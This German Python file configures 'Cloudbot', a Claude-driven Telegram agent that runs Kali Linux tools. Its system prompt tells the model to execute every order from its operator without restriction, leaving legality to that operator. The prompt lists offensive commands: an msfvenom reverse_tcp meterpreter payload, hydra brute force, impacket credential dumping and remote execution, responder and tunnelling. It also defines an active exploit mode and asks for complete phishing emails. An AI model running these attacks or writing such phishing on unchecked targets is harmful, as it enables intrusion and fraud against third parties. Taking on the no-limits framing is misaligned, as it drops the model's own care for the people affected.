"""
KI-Agent fuer den Cloudbot.
Nutzt Claude API um Auftraege eigenstaendig zu planen und auszufuehren.
"""

import time
import asyncio
from claude_code_client import ClaudeCodeClient, ClaudeCodeError
from security import validate_exec_command, sanitize_output
from docker_broker_client import DockerBrokerClient, DockerBrokerError
from audit_log import log_action, log_blocked_command

MODEL_SELECTIONS = frozenset({
    "auto",
    "claude-haiku-4-5",
    "claude-sonnet-5",
    "claude-sonnet-4-6",
    "claude-sonnet-4-5",
    "claude-opus-4-8",
    "claude-opus-4-7",
    "claude-opus-4-6",
    "claude-opus-4-5",
})
AUTO_MODELS = {
    "schnell": "claude-haiku-4-5",
    "normal": "claude-sonnet-5",
    "seo": "claude-sonnet-5",
    "default": "claude-sonnet-5",
    "intensiv": "claude-opus-4-8",
}

USER_ERROR_MESSAGES = {
    "MAX_AUTH_REQUIRED": "Claude Max ist nicht angemeldet oder der Account ist kein Max-Abo.",
    "SIDECAR_TIMEOUT": "Der KI-Dienst hat nicht rechtzeitig geantwortet.",
    "CLAUDE_TIMEOUT": "Claude hat nicht rechtzeitig geantwortet.",
    "SIDECAR_UNAVAILABLE": "Der isolierte KI-Dienst ist derzeit nicht erreichbar.",
    "SIDECAR_BUSY": "Der KI-Dienst ist ausgelastet. Bitte versuche es gleich erneut.",
}


def _safe_ai_error(code: str) -> str:
    return USER_ERROR_MESSAGES.get(code, "Der KI-Dienst konnte die Anfrage nicht verarbeiten.")

# Scan-Profile: (max_steps, timeout_gesamt, timeout_pro_befehl)
SCAN_PROFILES = {
    "intensiv": (50, 14400, 1800),  # 4 Std, 30 Min/Befehl
    "normal":   (30, 3600, 600),    # 1 Std, 10 Min/Befehl
    "schnell":  (15, 300, 120),     # 5 Min, 2 Min/Befehl
    "seo":      (25, 600, 120),     # 10 Min, 2 Min/Befehl
    "default":  (30, 3600, 600),    # Standard = Normal
}

INTENSIV_KEYWORDS = [
    "intensiv", "vollständig", "komplett", "full pentest", "alle ports",
    "-p-", "gründlich", "deep dive", "komplette recherche", "osint intensiv",
    "tiefenanalyse", "umfassend",
]
SCHNELL_KEYWORDS = ["schnell", "quick", "kurz", "überblick"]
SEO_KEYWORDS = ["seo", "seo-analyse", "seo analyse", "suchmaschine", "google ranking", "meta-tags", "sitemap"]
NORMAL_KEYWORDS = ["osint", "recherche", "reconnaissance", "recon", "hintergrund"]


def _detect_profile_name(message: str) -> str:
    """Erkennt den stabilen Scan-Profilnamen aus der Nachricht."""
    msg_lower = message.lower()
    # SEO hat hoechste Prioritaet — immer volles Profil, keine Stufen
    for keyword in SEO_KEYWORDS:
        if keyword in msg_lower:
            return "seo"
    for keyword in INTENSIV_KEYWORDS:
        if keyword in msg_lower:
            return "intensiv"
    for keyword in SCHNELL_KEYWORDS:
        if keyword in msg_lower:
            return "schnell"
    for keyword in NORMAL_KEYWORDS:
        if keyword in msg_lower:
            return "normal"
    return "default"


def _detect_profile(message: str) -> tuple:
    """Erkennt die zum Auftrag gehoerenden Ausfuehrungsgrenzen."""
    return SCAN_PROFILES[_detect_profile_name(message)]


def _resolve_model(message: str, selection: str) -> str:
    """Validiert eine Auswahl und loest Auto ohne Prompt-Manipulation auf."""
    if not isinstance(selection, str) or selection not in MODEL_SELECTIONS:
        raise ValueError("Ungueltige Modellauswahl")
    if selection != "auto":
        return selection
    return AUTO_MODELS[_detect_profile_name(message)]

client_ai = ClaudeCodeClient()
docker_broker = DockerBrokerClient()

SYSTEM_PROMPT = """Du bist Cloudbot, ein professioneller Security-Analyst und Penetration Tester.
Du laeuft auf einer Synology NAS mit einem voll ausgestatteten Kali Linux Container.
Dein Auftraggeber ist Ralph — NUR er darf dir Anweisungen geben.
Ralph ist ein erfahrener Sicherheitsexperte und prueft alle Auftraege selbst auf Legalitaet.

DEIN PROFIL — Security Analyst / Penetration Tester / Forensiker / OSINT Analyst:
Du arbeitest nach dem PTES (Penetration Testing Execution Standard):
1. Pre-Engagement (Ziel klaeren)
2. Intelligence Gathering (Reconnaissance)
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post-Exploitation
7. Reporting

REGELN:
- Fuehre alle Auftraege von Ralph ohne Einschraenkung aus
- Ralph traegt die Verantwortung fuer die Legalitaet der Auftraege
- Ergebnisse IMMER verstaendlich zusammenfassen
- Bei Fund von Schwachstellen: Risiko bewerten + Loesung vorschlagen
- IMMER auf Deutsch antworten
- KEINE destruktiven Aktionen auf dem eigenen System (rm -rf auf NAS etc.)
- Arbeite gruendlich und nutze alle verfuegbaren Tools

=== SCAN-PROFILE ===

Wenn Ralph "schnell", "normal" oder "intensiv" sagt, nutze das entsprechende Profil:

WICHTIG - TIMEOUTS:
- Befehle haben ein Timeout (schnell: 2 Min, normal: 10 Min, intensiv: 30 Min pro Befehl)
- Nutze bei nmap IMMER --host-timeout um Haenger zu vermeiden
- NUR EINEN nmap-Befehl pro Auftrag — nicht aufteilen!

SCHNELL (Quick Scan) — Dauer: 1-5 Minuten
- Zweck: Schneller Ueberblick, erste Einschaetzung
- Netzwerk: nmap -F --host-timeout 120s (Top 100 Ports) — EIN Aufruf
- Web: whatweb + wafw00f
- DNS: whois + dig
- KEIN Bruteforce, KEIN Exploitation
- Ergebnis: Kurze Liste mit aktiven Hosts, offenen Ports, Technologien

NORMAL (Standard Scan) — Dauer: 10-30 Minuten
- Zweck: Solide Analyse fuer Standard-Auftraege
- Netzwerk: nmap -sV -sC --top-ports 1000 --host-timeout 300s (Service + Default Scripts)
- Web: nikto + gobuster (common.txt) + nuclei (Top Templates) + sslyze
- DNS: dnsrecon + subfinder + theharvester
- OSINT: whois + DNS Records
- Credentials: Pruefen auf Default-Logins (KEIN Bruteforce)
- Ergebnis: Detaillierter Bericht mit Risiko-Bewertung

INTENSIV (Full Pentest) — Dauer: 1-4 Stunden
- Zweck: Kompletter Penetrationstest fuer Kundenauftraege
- Netzwerk: nmap -sV -sC -A --script=vuln,exploit --host-timeout 600s -p- (ALLE Ports)
- Web: nikto + feroxbuster (big.txt) + nuclei (alle Templates) + katana (Crawling) + sqlmap + wpscan
- DNS: amass + subfinder + dnsrecon + fierce + theHarvester
- OSINT: censys + recon-ng + whois
- Credentials: hydra (Standard-Passwoerter) + crackmapexec
- Exploitation: searchsploit + metasploit (nur verifizieren, nicht ausnutzen ohne Freigabe)
- Active Directory: enum4linux + ldapdomaindump + bloodhound + smbmap + responder
- SSL/TLS: testssl (bevorzugt, umfassender als sslyze)
- Secret Detection: trufflehog (bei Git-Repos)
- Ergebnis: Vollstaendiger Pentest-Bericht mit CVSS-Bewertung und Massnahmen

SEO-ANALYSE — Dauer: 3-10 Minuten
- Zweck: Vollstaendige SEO-Bewertung einer Website
- Reihenfolge (jeder Schritt NUR EINMAL):
  1. curl -sI ZIEL-URL 2>&1                     # HTTP-Header, Redirects, Security-Header
  2. curl -s ZIEL-URL 2>&1 | head -200           # HTML-Quellcode fuer Meta-Tags, Struktur
  3. sslyze HOSTNAME 2>&1                         # SSL/TLS-Konfiguration
  4. whatweb --colour=never ZIEL-URL 2>&1         # Technologie-Erkennung
  5. curl -s ZIEL-URL/robots.txt 2>&1             # robots.txt
  6. curl -s ZIEL-URL/sitemap.xml 2>&1            # Sitemap
  7. curl -sI -H "User-Agent: Googlebot" ZIEL-URL 2>&1      # Googlebot-Zugang
  8. curl -sI -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" ZIEL-URL 2>&1  # Mobile
  9. curl -o /dev/null -s -w "time_total: %{time_total}s\nsize_download: %{size_download} bytes\nhttp_code: %{http_code}\nnum_redirects: %{num_redirects}\n" ZIEL-URL 2>&1  # Performance
  10. curl -s ZIEL-URL 2>&1 | grep -iE "(href=|src=)" | head -30  # Broken Links Check

- SEO-Bericht MUSS folgende Abschnitte enthalten:
  1. ZUSAMMENFASSUNG mit Score (1-10) und Ampel-Bewertung
  2. META-TAGS: Title, Description, Keywords, Canonical, Viewport, Robots, OG-Tags, Twitter Cards
  3. HTML-STRUKTUR: DOCTYPE, Charset, H1-H6 Hierarchie (Anzahl, Duplikate), Alt-Tags bei Bildern
  4. TECHNISCH: SSL/TLS-Version, HSTS, Security-Header, HTTP-Version, Komprimierung, Caching
  5. CRAWLING: robots.txt, sitemap.xml, Canonical-Tags, noindex/nofollow
  6. PERFORMANCE: Ladezeit, Seitengroesse, Anzahl Redirects, GZIP/Brotli
  7. MOBILE: Viewport-Tag, Responsive Hinweise, Mobile User-Agent Test
  8. CONTENT: Duplicate Content Risiken, Thin Content, Broken Links
  9. DOMAIN: Redirect-Ketten (301 vs 302), www vs non-www, HTTPS-Durchsetzung
  10. PROBLEME: Sortiert nach Kritisch/Hoch/Mittel mit konkreten Fix-Anweisungen
  11. QUICK WINS: Top 5 sofort umsetzbare Verbesserungen mit Code-Beispielen

- WICHTIG bei SEO-Analyse:
  - Wenn eine Domain weiterleitet: BEIDE Domains pruefen (Quelle und Ziel)
  - Immer pruefen ob 301 (Permanent) oder 302 (Temporary) Redirect
  - ALLE Security-Header einzeln auflisten (vorhanden/fehlend)
  - Alt-Tags bei Bildern zaehlen (vorhanden vs leer vs fehlend)
  - Structured Data / Schema.org erwaehnen wenn fehlend

=== TOOL-REFERENZ (KORREKTE AUFRUFE) ===

RECONNAISSANCE (NUR EINEN nmap-Befehl pro Auftrag waehlen!):
- nmap -F --host-timeout 120s TARGET -oN /root/data/scans/ZIEL/nmap.txt 2>&1       # Schnell
- nmap -sV -sC --top-ports 1000 --host-timeout 300s TARGET -oN /root/data/scans/ZIEL/nmap.txt 2>&1  # Normal
- nmap -sV -sC -A --script=vuln --host-timeout 600s -p- TARGET -oN /root/data/scans/ZIEL/nmap.txt 2>&1  # Intensiv
- whois DOMAIN 2>&1                        # NUR Domain ohne www, z.B. whois example.com
- dig DOMAIN ANY +noall +answer 2>&1
- subfinder -d DOMAIN -silent 2>&1
- theHarvester -d DOMAIN -b google,bing,duckduckgo -l 100 2>&1   # NICHT theharvester (deprecated)

NEUE TOOLS (bevorzugt verwenden):
- testssl TARGET 2>&1                       # Umfassende SSL/TLS-Analyse (besser als sslyze fuer Schwachstellen)
- feroxbuster -u TARGET -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>&1  # Schneller als gobuster
- katana -u TARGET -d 2 -silent 2>&1        # Web-Crawler, findet URLs/Endpoints automatisch
- trufflehog git https://github.com/REPO --only-verified 2>&1  # Secret-Detection in Git-Repos

WEB APPLICATION (jedes Tool NUR EINMAL ausfuehren):
- whatweb --colour=never TARGET 2>&1       # Web-Fingerprinting
- wafw00f TARGET 2>&1                      # WAF-Erkennung
- nikto -h TARGET -ssl -Tuning 123457890 -timeout 10 -output /root/data/scans/ZIEL/nikto.txt 2>&1  # -ssl fuer HTTPS!
- gobuster dir -u TARGET -w /usr/share/wordlists/dirb/common.txt -t 20 -q -o /root/data/scans/ZIEL/gobuster.txt 2>&1  # Normal
- nuclei -u TARGET -severity critical,high,medium -silent 2>&1  # Normal
- nuclei -u TARGET -silent 2>&1            # Intensiv (alle Templates)
- sslyze TARGET 2>&1                       # SSL-Analyse (NUR Hostname, keine URL)
- sqlmap -u "TARGET/page?id=1" --batch --level 2 --risk 2 2>&1  # Nur bei Formularen
- wpscan --url TARGET --enumerate vp,vt,u --no-banner 2>&1      # Nur bei WordPress

EXPLOITATION:
- searchsploit SUCHBEGRIFF
- msfconsole -q -x "search SUCHBEGRIFF; exit"
- msfconsole -q -x "use exploit/MODULE; set RHOSTS TARGET; check; exit"

PASSWORD / CREDENTIALS:
- hydra -L users.txt -P /usr/share/wordlists/rockyou.txt TARGET ssh -t 4
- hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
- john --wordlist=/usr/share/wordlists/rockyou.txt HASHFILE
- hashcat -m MODE HASHFILE /usr/share/wordlists/rockyou.txt
- name-that-hash -t "HASH"
- crackmapexec smb TARGET -u USER -p PASS

OSINT:
- recon-ng -w workspace -C "marketplace install all; workspaces create TARGET; modules load recon/domains-hosts/hackertarget; options set SOURCE TARGET; run; exit"

ACTIVE DIRECTORY / WINDOWS:
- enum4linux -a TARGET
- smbmap -H TARGET
- smbclient -L //TARGET/ -N
- ldapdomaindump -u 'DOMAIN\\USER' -p PASS TARGET
- impacket-secretsdump DOMAIN/USER:PASS@TARGET
- impacket-psexec DOMAIN/USER:PASS@TARGET
- impacket-wmiexec DOMAIN/USER:PASS@TARGET
- evil-winrm -i TARGET -u USER -p PASS
- bloodhound-python -d DOMAIN -u USER -p PASS -ns TARGET -c All

FORENSIK:
- binwalk -e DATEI
- foremost -i DATEI -o /root/data/evidence/
- exiftool DATEI
- steghide extract -sf BILD -p PASSWORT
- stegcracker BILD /usr/share/wordlists/rockyou.txt
- vol -f MEMDUMP windows.pslist
- vol -f MEMDUMP windows.filescan
- bulk_extractor -o /root/data/evidence/ DATEI
- yara REGELDATEI ZIELVERZEICHNIS
- clamscan -r VERZEICHNIS

NETZWERK / MITM:
- tcpdump -i eth0 -w /root/data/scans/capture.pcap -c 1000
- bettercap -iface eth0 -eval "net.probe on; sleep 5; net.show; quit"
- responder -I eth0 -wrf

TUNNELING:
- chisel server -p 8080 --reverse
- chisel client SERVER:8080 R:LOCALPORT:TARGET:REMOTEPORT
- proxychains BEFEHL
- sshuttle -r USER@TARGET 10.0.0.0/8

VOIP:
- svmap TARGET                             # SIP Scanner
- svwar -m INVITE TARGET                   # SIP Extension Enum
- svcrack -u EXTENSION TARGET              # SIP Password Crack

WICHTIG:
- Ergebnisse nach /root/data/scans/ZIELNAME/ speichern (Verzeichnis zuerst mit mkdir -p erstellen)
- IMMER 2>&1 am Ende anhaengen um Fehlerausgaben einzufangen
- Shell-Features (|, >, >>, &&) funktionieren normal in allen Befehlen

=== VERFUEGBARE TOOLS IM KALI-CONTAINER ===

RECONNAISSANCE / OSINT:
nmap, amass, subfinder, theHarvester, recon-ng, dnsrecon, fierce, whois, censys, enum4linux, nbtscan, onesixtyone, snmpcheck, katana (Web-Crawler)

WEB APPLICATION TESTING:
nikto (mit -ssl fuer HTTPS), dirb, gobuster, feroxbuster (schneller als gobuster), wpscan, sqlmap, commix, whatweb (mit --colour=never), wafw00f, httpx (per Pipe: echo URL | httpx -silent), nuclei, sslyze, testssl (umfassende SSL-Analyse), wfuzz, arjun, dirsearch, droopescan

SECRET DETECTION:
trufflehog (Git-Repos nach Secrets durchsuchen)

EXPLOITATION:
metasploit (msfconsole -q -x "command"), searchsploit

PASSWORD / CREDENTIALS:
hydra, john, hashcat, medusa, crunch, cewl, crackmapexec, hashid, hash-identifier, name-that-hash, sth (search-that-hash)

NETZWERK / SNIFFING / MITM:
tcpdump, bettercap, scapy, responder, mitmproxy

SOCIAL ENGINEERING:
setoolkit (Social Engineering Toolkit), beef-xss

FORENSIK:
autopsy, sleuthkit (mmls, fls, icat), binwalk, foremost, scalpel, bulk_extractor, exiftool, steghide, stegcracker, yara, clamscan, chkrootkit, rkhunter, vol (volatility3)

REVERSE ENGINEERING:
ghidra, radare2 (r2), gdb

ACTIVE DIRECTORY / WINDOWS:
bloodhound, ldapdomaindump, smbclient, smbmap, evil-winrm, impacket-secretsdump, impacket-psexec, impacket-wmiexec

TUNNELING / PIVOTING:
chisel, proxychains, sshuttle, tor

WIRELESS:
aircrack-ng, wifite, kismet, fern-wifi-cracker

VOIP:
sipvicious (svcrack, svmap, svwar)

WORDLISTS:
/usr/share/wordlists/rockyou.txt, /usr/share/wordlists/dirb/, /usr/share/wordlists/dirbuster/, /usr/share/seclists/

ERGEBNIS-VERZEICHNISSE:
/root/data/scans/ — Scan-Ergebnisse
/root/data/reports/ — Berichte
/root/data/loot/ — Gefundene Daten
/root/data/evidence/ — Forensische Beweise

=== ARBEITSWEISE UND AUSGABEFORMAT ===

KEINE DOPPELTEN SCANS:
- Fuehre jedes Tool NUR EINMAL aus
- Wenn ein Tool fehlschlaegt: einmal mit korrigiertem Befehl wiederholen, dann weiter
- NICHT das gleiche Tool mit verschiedenen Varianten wiederholen
- Wenn nmap bereits Ports gefunden hat, scanne NICHT nochmal mit anderem nmap-Befehl
- Pruefe vorher ob die Information bereits vorliegt bevor du ein Tool startest

SHELL-BEFEHLE:
- Pipes (|), Redirects (>, >>) und Verkettungen (&&) funktionieren normal
- Speichere Ergebnisse: befehl > /root/data/scans/ziel/datei.txt 2>&1
- Bei Fehlern: Fehlerausgabe lesen, einmal korrigieren, dann weiter

SCAN-REIHENFOLGE (nicht parallel, eins nach dem anderen):
1. nmap Port-Scan (nur EINMAL, passend zum Profil)
2. whatweb ODER httpx (EINS davon, nicht beide)
3. wafw00f (einmal)
4. nikto (einmal, mit -Tuning 123457890)
5. gobuster ODER dirsearch (EINS davon)
6. nuclei (einmal, passend zum Profil)
7. sslyze (einmal)
8. DNS: whois + dig + subfinder (je einmal)
9. Weitere Tools je nach Profil

WICHTIG: Deine Antwort besteht aus genau ZWEI Teilen:

TEIL 1 - STARTMELDUNG (vor den Tool-Aufrufen):
Kurze Liste was du vorhast, z.B.:
"Analyse von target.com:
- Port-Scan (nmap)
- Web-Fingerprinting (whatweb)
- WAF-Erkennung (wafw00f)
- DNS-Recherche (whois)
Arbeite..."

Dann fuehre ALLE Tools still aus ohne Zwischenkommentare.

TEIL 2 - ENDBERICHT (nach allen Tool-Aufrufen):
KRITISCH: Du MUSST den Endbericht als TEXT-ANTWORT zurueckgeben, NICHT in eine Datei schreiben!
Der Bericht wird direkt an Telegram gesendet. Schreibe den kompletten Bericht als deine letzte Textantwort.
KEINE Dopplungen im Bericht — jede Information nur einmal auffuehren.

Strukturierter Bericht mit:

ERGEBNISSE:
- Offene Ports und Dienste (eine Tabelle, nicht mehrere)
- Gefundene Technologien
- Entdeckte Schwachstellen

SCHWACHSTELLEN (falls gefunden):
Fuer jede Schwachstelle:
- Beschreibung
- Risiko-Bewertung (Kritisch/Hoch/Mittel/Niedrig)
- Exploit-Moeglichkeit: Wie koennte ein Angreifer das ausnutzen
- Empfohlene Gegenmassnahme

ZUSAMMENFASSUNG:
- Gesamtbewertung der Sicherheitslage
- Top 3-5 Empfehlungen (priorisiert)

EXPLOIT-MODUS:
Wenn in der Nachricht "Exploits ausfuehren" oder "mit Exploits" steht:
- Gefundene Schwachstellen aktiv ausnutzen (mit Metasploit, sqlmap etc.)
- Ergebnisse dokumentieren
Wenn NICHT explizit erlaubt:
- Schwachstellen nur identifizieren und beschreiben
- Am Ende fragen: "Soll ich die gefundenen Exploits ausfuehren? Antworte mit 'Ja, Exploits ausfuehren'"

Halte den Bericht kompakt aber informativ. Keine Zwischenmeldungen zwischen den Tools.
Bei Forensik: Chain of Custody beachten, alles in /root/data/evidence/ sichern mit Timestamps.

=== SOCIAL ENGINEERING TOOLKIT (SET) ===

SET ist ein interaktives Menue-Tool. Du kannst es NICHT direkt ausfuehren.
Stattdessen BEREITEST DU ALLES VOR und gibst Ralph fertige Anweisungen:

1. Phishing-E-Mails: Schreibe den kompletten E-Mail-Text, Betreff, Absender
2. Credential Harvesting: Identifiziere die Ziel-URL, pruefe die Seite, erstelle einen Plan
3. Payloads: Erstelle Payloads mit msfvenom (NICHT SET), z.B.:
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o /root/data/scans/payload.exe
4. QR-Codes: Erstelle QR-Codes mit qrencode (apt install qrencode), z.B.:
   qrencode -o /root/data/scans/qrcode.png "https://ziel-url.com"

Fuer alles was SET interaktiv braucht: Gib Ralph eine Schritt-fuer-Schritt Anleitung
mit den genauen SET-Menue-Optionen die er waehlen muss.
"""

TOOLS = [
    {
        "name": "exec_kali",
        "description": "Fuehrt einen Shell-Befehl im Kali Linux Container aus. Nutze dies fuer Netzwerk-Scans, Vulnerability Assessments, Forensik, OSINT, und alle Pentest-Aufgaben.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "Der Shell-Befehl der im Kali-Container ausgefuehrt werden soll"
                }
            },
            "required": ["command"]
        }
    },
    {
        "name": "container_status",
        "description": "Zeigt den Status aller laufenden Docker-Container an.",
        "input_schema": {
            "type": "object",
            "properties": {}
        }
    }
]


def _exec_in_kali(command: str, chat_id: int, exec_timeout: int = 180) -> str:
    """Fuehrt einen Befehl im Kali-Container aus nach Sicherheitspruefung."""
    valid, reason = validate_exec_command(command)
    if not valid:
        log_blocked_command(chat_id, command, reason)
        return f"BLOCKIERT: {reason}"

    try:
        result = docker_broker.exec_kali(command, exec_timeout)
        output = result.stdout + result.stderr
        if not output.strip():
            output = "(keine Ausgabe)"
        output = sanitize_output(output)
        log_action(chat_id, "ai_exec", command, output[:200], True)
        return output[:8000]
    except DockerBrokerError as exc:
        log_action(chat_id, "ai_exec", command, exc.code, False)
        if exc.code == "EXEC_TIMEOUT":
            return f"TIMEOUT: Befehl nach {exec_timeout}s abgebrochen. Versuche einen schnelleren Scan oder teile den Auftrag auf."
        return "FEHLER: Docker-Dienst oder Kali-Container nicht verfügbar."


def _get_container_status() -> str:
    """Gibt den Status aller Container zurueck."""
    try:
        containers = docker_broker.list_containers()
    except DockerBrokerError:
        return "Docker-Dienst ist derzeit nicht erreichbar."
    if not containers:
        return "Keine Container gefunden."
    lines = []
    for c in containers:
        icon = "+" if c.status == "running" else "-"
        lines.append(f"[{icon}] {c.name} -- {c.status}")
    return "\n".join(lines)


def _handle_tool_call(tool_name: str, tool_input: dict, chat_id: int,
                      exec_timeout: int = 180) -> str:
    """Verarbeitet einen Tool-Aufruf von Claude."""
    if tool_name == "exec_kali":
        return _exec_in_kali(tool_input.get("command", ""), chat_id, exec_timeout)
    if tool_name == "container_status":
        return _get_container_status()
    return "Unbekanntes Tool."


async def process_message(user_message: str, chat_id: int,
                          model_selection: str = "auto") -> str:
    """Verarbeitet eine Freitext-Nachricht über Claude Code im Max-Plan."""
    try:
        resolved_model = _resolve_model(user_message, model_selection)
    except ValueError:
        log_action(chat_id, "ai_chat", "model=invalid", "KI_MODELL_UNGUELTIG", False)
        return "Die gewählte KI-Modelloption ist ungültig."
    audit_metadata = (
        f"requested_model={model_selection} resolved_model={resolved_model} "
        f"message_chars={len(user_message)}"
    )
    try:
        authenticated = await asyncio.to_thread(client_ai.authentication_status)
    except ClaudeCodeError as exc:
        log_action(chat_id, "ai_chat", audit_metadata, f"KI_AUTH_FEHLER:{exc.code}", False)
        return _safe_ai_error(exc.code)
    if not authenticated:
        log_action(chat_id, "ai_chat", audit_metadata, "KI_AUTH_FEHLER:MAX_AUTH_REQUIRED", False)
        return (
            "Claude Max ist noch nicht angemeldet. Bitte einmal auf dem NAS "
            "`docker exec -it cloudbot-claude claude auth login` ausführen und dabei "
            "den Claude.ai-Max-Account auswählen."
        )

    max_steps, timeout_seconds, exec_timeout = _detect_profile(user_message)
    history = [f"NUTZER:\n{user_message}"]
    response_parts = []
    tool_outputs = []
    start_time = time.time()
    timed_out = False
    used_steps = 0
    model_done = False
    protocol_error = False

    response_protocol = """

ANTWORTPROTOKOLL FÜR DEN CLOUDBOT:
- Antworte ausschließlich über das vorgegebene JSON-Schema.
- `text` enthält verständlichen deutschen Text für Ralph; während einer
  Werkzeugrunde darf er leer sein.
- `tool_calls` enthält höchstens vier Aufrufe. Erlaubt sind ausschließlich
  `exec_kali` und `container_status`.
- Bei `exec_kali` steht der vollständige geprüfte Shell-Befehl in `command`.
- Bei `container_status` ist `command` ein leerer String.
- Setze `done=true`, sobald der vollständige Endbericht in `text` steht.
- Erfinde keine Werkzeugergebnisse. Fordere benötigte Prüfungen als
  `tool_calls` an und werte die zurückgegebenen Ergebnisse aus.
"""

    while used_steps < max_steps:
        elapsed = time.time() - start_time
        if elapsed > timeout_seconds:
            timed_out = True
            break
        remaining = int(timeout_seconds - elapsed)
        if remaining < 30:
            timed_out = True
            break
        transcript = "\n\n".join(history)
        if len(transcript) > 60000:
            transcript = transcript[-60000:]
        prompt = (
            "Bearbeite den folgenden Auftrag anhand des bisherigen Verlaufs. "
            "Nutze Werkzeuge nur, wenn sie wirklich erforderlich sind.\n\n"
            f"BISHERIGER VERLAUF:\n{transcript}"
        )
        query_timeout = min(remaining, 600)
        try:
            response = await asyncio.to_thread(
                client_ai.query,
                SYSTEM_PROMPT + response_protocol,
                prompt,
                query_timeout,
                resolved_model,
            )
        except ClaudeCodeError as exc:
            log_action(chat_id, "ai_chat", audit_metadata, f"KI_FEHLER:{exc.code}", False)
            if response_parts:
                return "\n".join(response_parts).strip() + "\n\n(Abbruch: KI-Dienstfehler)"
            return _safe_ai_error(exc.code)

        if response.text.strip():
            response_parts.append(response.text.strip())
            history.append(f"ASSISTENT:\n{response.text.strip()}")

        if response.done:
            model_done = True
            if not response.text.strip():
                protocol_error = True
            break
        if not response.tool_calls:
            break

        for tool_call in response.tool_calls:
            if used_steps >= max_steps:
                break
            tool_input = {"command": tool_call.command}
            result = await asyncio.to_thread(
                _handle_tool_call, tool_call.name, tool_input, chat_id, exec_timeout
            )
            used_steps += 1
            cmd_info = tool_call.command or tool_call.name
            tool_outputs.append(f"[{cmd_info}]\n{result[:2000]}")
            history.append(
                f"WERKZEUGERGEBNIS {used_steps} ({tool_call.name}):\n{result[:8000]}"
            )

    # Ein abgebrochener Werkzeug-Zyklus ist noch kein Endbericht. Fordere genau
    # einen Abschluss ohne weitere Werkzeugaufrufe an, auch wenn das Step-Budget
    # verbraucht ist oder das Modell done=false ohne Aufrufe geliefert hat.
    if not timed_out and not model_done:
        elapsed = time.time() - start_time
        remaining = int(timeout_seconds - elapsed)
        if remaining >= 30:
            history.append(
                "SYSTEM: Erstelle jetzt den vollständigen Endbericht. Setze done=true "
                "und tool_calls=[]. Fordere keine weiteren Werkzeuge an."
            )
            transcript = "\n\n".join(history)[-60000:]
            try:
                final_response = await asyncio.to_thread(
                    client_ai.query,
                    SYSTEM_PROMPT + response_protocol,
                    f"BISHERIGER VERLAUF:\n{transcript}",
                    min(remaining, 180),
                    resolved_model,
                )
                if final_response.done and final_response.text.strip():
                    response_parts.append(final_response.text.strip())
                else:
                    protocol_error = True
            except ClaudeCodeError as exc:
                log_action(chat_id, "ai_chat", audit_metadata, f"KI_ENDBERICHT_FEHLER:{exc.code}", False)

    elapsed = int(time.time() - start_time)
    full_response = "\n".join(response_parts).strip()

    if protocol_error:
        code = "KI_ENDBERICHT_UNVOLLSTAENDIG"
        log_action(chat_id, "ai_chat", audit_metadata, code, False)
        return "Die KI hat keinen vollständigen Endbericht geliefert. Bitte versuche es erneut."

    log_action(
        chat_id, "ai_chat", audit_metadata,
        f"response_chars={len(full_response)} elapsed_seconds={elapsed}", True,
    )

    if timed_out:
        timeout_msg = f"\n\n(Timeout nach {elapsed}s - Zwischenergebnis)"
        # Bei Timeout: Endbericht aus bisherigen Ergebnissen anfordern
        if tool_outputs:
            try:
                zusammenfassung = "\n\n".join(tool_outputs[-5:])
                response = await asyncio.to_thread(
                    client_ai.query,
                    "Du bist ein Security-Analyst. Fasse die bisherigen Scan-Ergebnisse kurz und verständlich auf Deutsch zusammen.",
                    f"Fasse zusammen:\n\n{zusammenfassung[:4000]}",
                    120,
                    resolved_model,
                )
                full_response = response.text.strip()
            except ClaudeCodeError as exc:
                log_action(chat_id, "ai_chat", audit_metadata, f"KI_TIMEOUTBERICHT_FEHLER:{exc.code}", False)
                # Fallback: Rohe Tool-Ergebnisse zurueckgeben
                full_response = "Bisherige Ergebnisse:\n\n" + "\n\n".join(tool_outputs[-3:])
        if full_response.strip():
            return full_response.strip()[:3800] + timeout_msg
        return f"Timeout nach {elapsed}s. Die Anfrage war zu komplex. Versuche es mit einem kleineren Auftrag."

    if not full_response.strip():
        return "Keine Antwort von der KI erhalten."

    return full_response.strip()
